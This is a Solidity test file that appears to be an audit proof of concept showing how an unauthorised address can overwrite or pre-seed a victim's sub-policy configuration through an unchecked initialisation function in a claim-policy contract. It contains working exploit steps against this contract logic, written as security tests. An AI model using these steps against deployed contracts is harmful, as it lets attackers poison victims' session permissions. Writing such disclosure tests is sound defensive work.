// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

// Dependencies
import { Base_Test } from "@test/Base.t.sol";

// Contracts
import { Permit2ClaimPolicy } from "@policies/claim/permit2/Permit2ClaimPolicy.sol";

// Interfaces
import { I1271Policy } from "@smartsessions/interfaces/IPolicy.sol";
import { IERC165 } from "@openzeppelin/contracts/interfaces/IERC165.sol";

// Types
import { ConfigId } from "@smartsessions/DataTypes.sol";
import { FIELD_ARBITER, MODE_CHECK_SUBPOLICY } from "@policies/claim/base/types/BaseDataTypes.sol";

/// @notice A sub-policy that stores its config the way every real policy does — namespaced by
/// (multiplexer, configId, account), where `multiplexer` is whoever called it.
/// @dev Deliberately faithful to the real pattern. `getConfig` reads with an explicit multiplexer
/// so the test can inspect the exact slot validation would read.
contract ProbeSubPolicy {
    mapping(
        address multiplexer => mapping(bytes32 configId => mapping(address account => uint256))
    ) internal $config;

    function initializeWithMultiplexer(
        address account,
        ConfigId configId,
        bytes calldata initData
    )
        external
    {
        $config[msg.sender][ConfigId.unwrap(configId)][account] = uint256(bytes32(initData[0:32]));
    }

    function getConfig(
        address multiplexer,
        ConfigId configId,
        address account
    )
        external
        view
        returns (uint256)
    {
        return $config[multiplexer][ConfigId.unwrap(configId)][account];
    }

    function check1271SignedAction(
        ConfigId,
        address,
        address,
        bytes32,
        bytes calldata
    )
        external
        pure
        returns (bool)
    {
        return true;
    }

    function supportsInterface(bytes4 interfaceId) external pure returns (bool) {
        return
            interfaceId == type(IERC165).interfaceId || interfaceId == type(I1271Policy).interfaceId;
    }
}

/// @title PoC — permissionless sub-policy initialization (RHI-5829)
/// @notice `BaseClaimPolicy.initializeWithMultiplexer` has no caller check, and forwards sub-policy
/// init under the parent's OWN address, which is a constant. So an attacker-initiated init and a
/// SmartSession-initiated init resolve to the same sub-policy storage slot — and it is the slot
/// read at validation time.
contract PermissionlessSubPolicyInit_PoC is Base_Test {
    Permit2ClaimPolicy internal claimPolicy;
    ProbeSubPolicy internal subPolicy;

    address internal victim;
    address internal attacker;
    ConfigId internal configId;

    /// @dev Stands in for SmartSession — the only party that should be able to configure this
    address internal multiplexer;

    uint256 internal constant VICTIM_VALUE = 42;
    uint256 internal constant ATTACKER_VALUE = 999;

    function setUp() public virtual override {
        super.setUp();

        claimPolicy = new Permit2ClaimPolicy(makeAddr("permit2"));
        subPolicy = new ProbeSubPolicy();

        victim = makeAddr("victim");
        attacker = makeAddr("attacker");
        multiplexer = makeAddr("smartSession");

        // configId derives from public session content, so an attacker can compute it in advance
        configId = ConfigId.wrap(keccak256("victim.bridge.session"));
    }

    /// @dev A minimal claim config whose arbiter field is gated by a sub-policy
    function _initData(uint256 value) internal view returns (bytes memory) {
        uint32 modeConfig = uint32(MODE_CHECK_SUBPOLICY) << (FIELD_ARBITER * 2);

        return abi.encodePacked(
            modeConfig,
            uint8(1), // sub-policy count
            uint8(FIELD_ARBITER),
            address(subPolicy),
            uint256(32), // length of the sub-policy's init data
            bytes32(value)
        );
    }

    /// @dev The victim's sub-policy config, at the key validation actually reads: the parent's
    ///      constant address, NOT whoever initiated the call
    function _victimSubPolicyConfig() internal view returns (uint256) {
        return subPolicy.getConfig(address(claimPolicy), configId, victim);
    }

    /*//////////////////////////////////////////////////////////////
                                  POC
    //////////////////////////////////////////////////////////////*/

    /// @notice An unrelated EOA overwrites the victim's live sub-policy config.
    function test_poc_attackerOverwritesVictimSubPolicyConfig() public {
        // The victim's session is configured legitimately, by the real multiplexer
        vm.prank(multiplexer);
        claimPolicy.initializeWithMultiplexer(victim, configId, _initData(VICTIM_VALUE));

        assertEq(_victimSubPolicyConfig(), VICTIM_VALUE, "victim's own value is live");

        // An unrelated address calls the deployed policy directly, passing the victim's account
        // and configId. No signature, no authorization, no relationship to the victim.
        vm.prank(attacker);
        claimPolicy.initializeWithMultiplexer(victim, configId, _initData(ATTACKER_VALUE));

        assertEq(
            _victimSubPolicyConfig(),
            ATTACKER_VALUE,
            "POISONED: the attacker's value now sits in the victim's live sub-policy slot"
        );
    }

    /// @dev The parent's own config, as seen by a given multiplexer. `getSubPolicy` reads with
    ///      `multiplexer: msg.sender`, so the caller determines which namespace is read.
    function _parentConfigAsSeenBy(address who) internal returns (address) {
        vm.prank(who);
        return claimPolicy.getSubPolicy(configId, victim, FIELD_ARBITER);
    }

    /// @notice Control — the parent's OWN config is correctly isolated.
    /// @dev This is the half that works, and it is why the defect is easy to miss: level 1 keys on
    ///      msg.sender, so the attacker's parent-level write lands in the attacker's own namespace
    ///      and is invisible to the real multiplexer. Only the forward — under the parent's
    ///      constant address — collides.
    function test_poc_control_parentConfigIsIsolatedPerMultiplexer() public {
        vm.prank(multiplexer);
        claimPolicy.initializeWithMultiplexer(victim, configId, _initData(VICTIM_VALUE));

        vm.prank(attacker);
        claimPolicy.initializeWithMultiplexer(victim, configId, _initData(ATTACKER_VALUE));

        // Both wrote a parent config, but into separate namespaces
        assertEq(
            _parentConfigAsSeenBy(multiplexer),
            address(subPolicy),
            "the real multiplexer still sees its own config"
        );
        assertEq(
            _parentConfigAsSeenBy(address(this)),
            address(0),
            "an uninvolved reader sees nothing: level 1 namespacing holds"
        );

        // ...while the sub-policy config they BOTH wrote is a single shared slot
        assertEq(
            _victimSubPolicyConfig(),
            ATTACKER_VALUE,
            "level 2 has no such isolation: last writer wins, and anyone may write"
        );
    }

    /// @notice Front-running the victim's enable seeds the slot before any legitimate config
    /// exists.
    function test_poc_attackerSeedsSlotBeforeVictimEnables() public {
        vm.prank(attacker);
        claimPolicy.initializeWithMultiplexer(victim, configId, _initData(ATTACKER_VALUE));

        assertEq(
            _victimSubPolicyConfig(),
            ATTACKER_VALUE,
            "attacker seeded the victim's slot before any legitimate enable"
        );
    }
}
